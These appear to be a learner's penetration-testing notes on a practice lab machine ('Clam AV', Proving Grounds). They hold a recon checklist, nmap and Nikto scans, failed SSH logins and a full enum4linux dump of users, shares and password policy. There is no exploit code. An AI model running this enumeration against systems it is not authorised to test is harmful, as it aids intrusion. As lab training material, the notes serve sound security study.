# Clam AV
## Plan
- [x] nmap simple scan
- [x] nmap full script scan
- [ ] nmap UDP scan?
- [ ] nmap vuln scan

### 22 - SSH OpenSSH 3.8.1p1 Debian 8.sarge.6
Understand how it works & Interact  [x] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

### 60000 - SSH OpenSSH 3.8.1p1 Debian 8.sarge.6
Understand how it works & Interact  [x] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

### **80 - Web**
#### Apache httpd 1.3.33
Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
	- [ ] https://www.exploit-db.com/exploits/67
	- [x] https://www.exploit-db.com/exploits/3384 - Must have CGI execution Privileges
- [ ] Google
- [ ] More

Source Code `E`
- [ ] Find all the files, hidden or not (if possible)
	- [x] Dir Enumeration
- [x] Look through the source code of ALL the files
	- [ ] Files
		- [x] Index.html
		- [x] Icons
    - [ ] Find all Input Fields `-> Input Fields`
    - [ ] File Uploads `-> File upload`

Directory Enumeration (dirb) `I -> Custom page/ CMS`
- [x] Sitemap (robots.txt)
- [x] Common wordlist
- [x] big wordlist
- [ ] More

Virtual Hosts Testing `I`
- [ ] Given hostname
- [ ] Hostname derived from box name
- [ ] More

Vulnerability Scanning `I`
- [x] Nikto Vulnerability Scanner
- [ ] More

### **199 - SMUX**

Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

### 445 - Samba smbd 3.0.14a-Debian
Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [x] Hacktricks https://book.hacktricks.xyz/pentesting/pentesting-smb
	- [ ] 

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

- [x] Enum4linux
- [x] SMBmap
- [x] Shares - Cannot Access

# Enumeration
Ran Autorecon

## Nmap

```
Nmap scan report for 192.168.123.42
Host is up, received user-set (0.27s latency).
Scanned at 2022-01-12 11:27:15 EST for 1650s
Not shown: 65508 closed ports
Reason: 65508 resets
PORT      STATE    SERVICE     REASON         VERSION
22/tcp    open     ssh         syn-ack ttl 63 OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALr/RyBq802QXa1Bh4SQEUHqD+p9TEx3SUvPHACbT0tQqR3aali+ifDiOpqMToVaRfWzYOOsoM2Neg0EPa4KsJIwSTkFqjd/3Ynp3Yzus0nN+gtmbQRKzo8QfStr6IGt6kaI6viXl4z3ww6ryEkjNnb74KCooHOjyeGPi3o89GVnAAAAFQDSg0dwMrSn9juW/XPvo8S8kVOhDQAAAIARaqFuvZCqiTY8i/PITsr5WvyZm8mQ0nuqB6gW6y1h4jDAvtHO4TIZEMJ5vtPst0w9mVSYGVFlukhCqhbJdBigqH1WB1p7kwC78M9k23zZmzuwbnzYPiLHpEdfFEWdO62ZoCSFBXWOqe1IZaTaRCgUZPeB1QFXRCQ96VrJizPLUAAAAIEArOALxR78fZrUqmUcYOs5tf8wu5xChAUqAfh1ElJ6r3EjcWwXId12jo1uAz0JmCTluUQhjhNDJB6XIgUzoFzW1NZPjGCkex7s1+2+TUTmqFr6Nr97k2RIy91Bpuxwg5jzE83cKPCOoWVbYlfzAqNkF4xxznfC3fRtmj2e/L9chzg=
|   1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAviGcDkDxKzv7w++DXy6q+5AJDpG/q8Um8j4BheW9fgwsOvQCuDvLcPUIKMYEz4aUgkt/sSCXu29XTlu79pEkb48+BnaRCKrHLH/YWM79GT6Q5ie9jP47HjjJeCCBI/c02qpkH/fjz9FK4HQPC7WtXY9EgW4IMB+pzX2KZxK2PF0=
80/tcp    open     http        syn-ack ttl 63 Apache httpd 1.3.33 ((Debian GNU/Linux))
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
|_http-title: Ph33r
139/tcp   open     netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open     smux        syn-ack ttl 63 Linux SNMP multiplexer
445/tcp   open     netbios-ssn syn-ack ttl 63 Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
9693/tcp  filtered unknown     no-response
12872/tcp filtered unknown     no-response
16094/tcp filtered unknown     no-response
17895/tcp filtered unknown     no-response
19500/tcp filtered unknown     no-response
19927/tcp filtered unknown     no-response
22148/tcp filtered unknown     no-response
27150/tcp filtered unknown     no-response
27278/tcp filtered unknown     no-response
27584/tcp filtered unknown     no-response
31198/tcp filtered unknown     no-response
31663/tcp filtered unknown     no-response
34027/tcp filtered unknown     no-response
34423/tcp filtered unknown     no-response
36958/tcp filtered unknown     no-response
45221/tcp filtered unknown     no-response
45494/tcp filtered unknown     no-response
49458/tcp filtered unknown     no-response
60000/tcp open     ssh         syn-ack ttl 63 OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALr/RyBq802QXa1Bh4SQEUHqD+p9TEx3SUvPHACbT0tQqR3aali+ifDiOpqMToVaRfWzYOOsoM2Neg0EPa4KsJIwSTkFqjd/3Ynp3Yzus0nN+gtmbQRKzo8QfStr6IGt6kaI6viXl4z3ww6ryEkjNnb74KCooHOjyeGPi3o89GVnAAAAFQDSg0dwMrSn9juW/XPvo8S8kVOhDQAAAIARaqFuvZCqiTY8i/PITsr5WvyZm8mQ0nuqB6gW6y1h4jDAvtHO4TIZEMJ5vtPst0w9mVSYGVFlukhCqhbJdBigqH1WB1p7kwC78M9k23zZmzuwbnzYPiLHpEdfFEWdO62ZoCSFBXWOqe1IZaTaRCgUZPeB1QFXRCQ96VrJizPLUAAAAIEArOALxR78fZrUqmUcYOs5tf8wu5xChAUqAfh1ElJ6r3EjcWwXId12jo1uAz0JmCTluUQhjhNDJB6XIgUzoFzW1NZPjGCkex7s1+2+TUTmqFr6Nr97k2RIy91Bpuxwg5jzE83cKPCOoWVbYlfzAqNkF4xxznfC3fRtmj2e/L9chzg=
|   1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAviGcDkDxKzv7w++DXy6q+5AJDpG/q8Um8j4BheW9fgwsOvQCuDvLcPUIKMYEz4aUgkt/sSCXu29XTlu79pEkb48+BnaRCKrHLH/YWM79GT6Q5ie9jP47HjjJeCCBI/c02qpkH/fjz9FK4HQPC7WtXY9EgW4IMB+pzX2KZxK2PF0=
60002/tcp filtered unknown     no-response
61509/tcp filtered unknown     no-response
64820/tcp filtered unknown     no-response
Device type: general purpose|firewall|proxy server|WAP|PBX|printer|media device|storage-misc
Running (JUST GUESSING): Linux 2.6.X (95%), Cisco embedded (95%), Riverbed embedded (94%), Ruckus embedded (94%), Kyocera embedded (93%), Sony embedded (92%), Dell embedded (91%)
OS CPE: cpe:/o:linux:linux_kernel:2.6.9 cpe:/o:linux:linux_kernel:2.6 cpe:/h:cisco:sa520 cpe:/h:riverbed:steelhead_200 cpe:/h:ruckus:7363 cpe:/h:cisco:uc320w cpe:/h:kyocera:cs-2560 cpe:/h:dell:dr4100
Aggressive OS guesses: Linux 2.6.9 (95%), Cisco SA520 firewall (Linux 2.6) (95%), Linux 2.6.9 - 2.6.27 (95%), Linux 2.6.18 (94%), Riverbed Steelhead 200 proxy server (94%), Ruckus 7363 WAP (94%), Linux 2.6.9 (CentOS 4.4) (93%), Linux 2.6.32 (93%), Cisco UC320W PBX (Linux 2.6) (93%), Kyocera CopyStar CS-2560 printer (93%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/12%OT=22%CT=1%CU=42312%PV=Y%DS=2%DC=T%G=Y%TM=61DF07D
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=C8%GCD=1%ISR=CC%TI=Z%II=I%TS=A)OPS(O1=M54
OS:EST11NW0%O2=M54EST11NW0%O3=M54ENNT11NW0%O4=M54EST11NW0%O5=M54EST11NW0%O6
OS:=M54EST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF
OS:=Y%T=40%W=16D0%O=M54ENNSNW0%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6
OS:(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.016 days (since Wed Jan 12 11:31:31 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=201 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 7h30m00s, deviation: 3h32m08s, median: 4h59m59s
| nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   0XBABE<00>           Flags: <unique><active>
|   0XBABE<03>           Flags: <unique><active>
|   0XBABE<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48725/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 11011/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 23330/udp): CLEAN (Failed to receive data)
|   Check 4 (port 41800/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-01-12T16:54:14-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   340.49 ms 192.168.49.1
2   342.72 ms 192.168.123.42

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 12 11:54:45 2022 -- 1 IP address (1 host up) scanned in 1653.04 seconds

```

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Heist]
└─$ sudo nmap -p- 192.168.162.42                          
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-28 19:36 EST
Stats: 0:04:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 28.26% done; ETC: 19:52 (0:11:28 remaining)
Stats: 0:07:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 46.71% done; ETC: 19:52 (0:08:28 remaining)
Nmap scan report for 192.168.162.42
Host is up (0.17s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
139/tcp   open  netbios-ssn
199/tcp   open  smux
445/tcp   open  microsoft-ds
60000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 962.17 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Heist]
└─$ 

```

## SSH - 22

#### Test
```
┌──(kali㉿kali)-[~]
└─$ ssh ryu@192.168.233.42 -oKexAlgorithms=+diffie-hellman-group1-sha1 if no matching key exchange found                                                          255 ⨯
The authenticity of host '192.168.233.42 (192.168.233.42)' can't be established.
RSA key fingerprint is SHA256:Vk92TR+v6+ZF1BSflZ65yVDMRBNhru5JJEAq2k8dG7g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.233.42' (RSA) to the list of known hosts.
Password: 
Password: 
Password: 
ryu@192.168.233.42: Permission denied (publickey,keyboard-interactive).
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ssh ryu@192.168.233.42 -p 60000 -oKexAlgorithms=+diffie-hellman-group1-sha1 if no matching key exchange found                                                 255 ⨯
Password: 
Password: 
^C
```


## SSH - 60000


## Web - 80

### Nikto

```
┌──(kali㉿kali)-[~]
└─$ nikto -h 192.168.70.42  
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.70.42
+ Target Hostname:    192.168.70.42
+ Target Port:        80
+ Start Time:         2022-01-13 09:33:14 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/1.3.33 (Debian GNU/Linux)
+ Server may leak inodes via ETags, header found with file /, inode: 418030, size: 289, mtime: Wed Jan 21 20:57:56 2009
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/1.3.33 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ 8724 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2022-01-13 10:17:58 (GMT-5) (2684 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
### Site


![](Pasted%20image%2020220113192948.png)


![](Pasted%20image%2020220113193030.png)



## 199/tcp Linux SNMP multiplexer

## 445/tcp Samba smbd 3.0.14a-Debian 

#### enum4linux

```
┌──(kali㉿kali)-[~]
└─$ enum4linux -a 192.168.233.42                                                                                                                                  130 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jan 13 07:05:39 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.233.42
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.233.42    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================== 
|    Nbtstat Information for 192.168.233.42    |
 ============================================== 
Looking up status of 192.168.233.42
        0XBABE          <00> -         B <ACTIVE>  Workstation Service
        0XBABE          <03> -         B <ACTIVE>  Messenger Service
        0XBABE          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.233.42    |
 ======================================= 
[+] Server 192.168.233.42 allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for 192.168.233.42    |
 ============================================= 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on 192.168.233.42    |
 ======================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.233.42 from smbclient: 
[+] Got OS info for 192.168.233.42 from srvinfo:
        0XBABE         Wk Sv PrQ Unx NT SNT 0xbabe server (Samba 3.0.14a-Debian) brave pig
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03

 =============================== 
|    Users on 192.168.233.42    |
 =============================== 
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x4 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x5 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x6 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0x7 RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0x8 RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0x9 RID: 0x3ea acb: 0x00000011 Account: daemon   Name: daemon    Desc: (null)
index: 0xa RID: 0xbb8 acb: 0x00000011 Account: ryu      Name: ryu,,,    Desc: (null)
index: 0xb RID: 0x3f4 acb: 0x00000011 Account: man      Name: man       Desc: (null)
index: 0xc RID: 0x3f6 acb: 0x00000011 Account: lp       Name: lp        Desc: (null)
index: 0xd RID: 0x4b4 acb: 0x00000011 Account: Debian-exim      Name: (null)    Desc: (null)
index: 0xe RID: 0x43a acb: 0x00000011 Account: gnats    Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0xf RID: 0x42c acb: 0x00000011 Account: backup   Name: backup    Desc: (null)
index: 0x10 RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x11 RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x12 RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x13 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x14 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[proxy] rid:[0x402]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[daemon] rid:[0x3ea]
user:[ryu] rid:[0xbb8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[Debian-exim] rid:[0x4b4]
user:[gnats] rid:[0x43a]
user:[backup] rid:[0x42c]
user:[sys] rid:[0x3ee]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 =========================================== 
|    Share Enumeration on 192.168.233.42    |
 =========================================== 
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
        ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
Reconnecting with SMB1 for workgroup listing.
​445/tcp Samba smbd 3.0.14a-Debian 
        Server               Comment
        ---------            -------
        0XBABE               0xbabe server (Samba 3.0.14a-Debian) brave pig

        Workgroup            Master
        ---------            -------
        WORKGROUP            0XBABE

[+] Attempting to map shares on 192.168.233.42
//192.168.233.42/print$ [E] Can't understand response:
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
tree connect failed: NT_STATUS_WRONG_PASSWORD
//192.168.233.42/IPC$   [E] Can't understand response:
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
//192.168.233.42/ADMIN$ [E] Can't understand response:
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
tree connect failed: NT_STATUS_WRONG_PASSWORD

 ====================================================== 
|    Password Policy Information for 192.168.233.42    |
 ====================================================== 


[+] Attaching to 192.168.233.42 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] 0XBABE
        [+] Builtin

[+] Password Info for Domain: 0XBABE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 0


 ================================ 
|    Groups on 192.168.233.42    |
 ================================ 

[+] Getting builtin groups:
group:[System Operators] rid:[0x225]
group:[Replicators] rid:[0x228]
group:[Guests] rid:[0x222]
group:[Power Users] rid:[0x223]
group:[Print Operators] rid:[0x226]
group:[Administrators] rid:[0x220]
group:[Account Operators] rid:[0x224]
group:[Backup Operators] rid:[0x227]
group:[Users] rid:[0x221]

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================= 
|    Users on 192.168.233.42 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[I] Found new SID: S-1-5-21-1974239401-1762029558-4115558683
[+] Enumerating users using SID S-1-5-21-1974239401-1762029558-4115558683 and logon username '', password ''
S-1-5-21-1974239401-1762029558-4115558683-500 0XBABE\Administrator (Local User)
S-1-5-21-1974239401-1762029558-4115558683-501 0XBABE\nobody (Local User)
S-1-5-21-1974239401-1762029558-4115558683-502 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-503 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-504 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-505 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-506 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-507 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-508 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-509 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-510 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-511 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-512 0XBABE\Domain Admins (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-513 0XBABE\Domain Users (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-514 0XBABE\Domain Guests (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-515 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-516 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-517 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-518 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-519 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-520 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-521 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-522 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-523 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-524 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-525 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-526 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-527 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-528 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-529 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-530 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-531 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-532 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-533 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-534 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-535 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-536 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-537 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-538 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-539 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-540 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-541 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-542 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-543 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-544 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-545 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-546 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-547 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-548 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-549 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-550 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1000 0XBABE\root (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1001 0XBABE\root (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1002 0XBABE\daemon (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1003 0XBABE\daemon (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1004 0XBABE\bin (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1005 0XBABE\bin (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1006 0XBABE\sys (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1007 0XBABE\sys (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1008 0XBABE\sync (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1009 0XBABE\adm (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1010 0XBABE\games (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1011 0XBABE\tty (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1012 0XBABE\man (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1013 0XBABE\disk (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1014 0XBABE\lp (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1015 0XBABE\lp (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1016 0XBABE\mail (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1017 0XBABE\mail (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1018 0XBABE\news (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1019 0XBABE\news (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1020 0XBABE\uucp (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1021 0XBABE\uucp (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1022 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1023 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1024 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1025 0XBABE\man (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1026 0XBABE\proxy (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1027 0XBABE\proxy (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1028 *unknown*\*unknown* (8)
S-1-5-21-1974239401-1762029558-4115558683-1029 *unknown*\*unknown* (8)
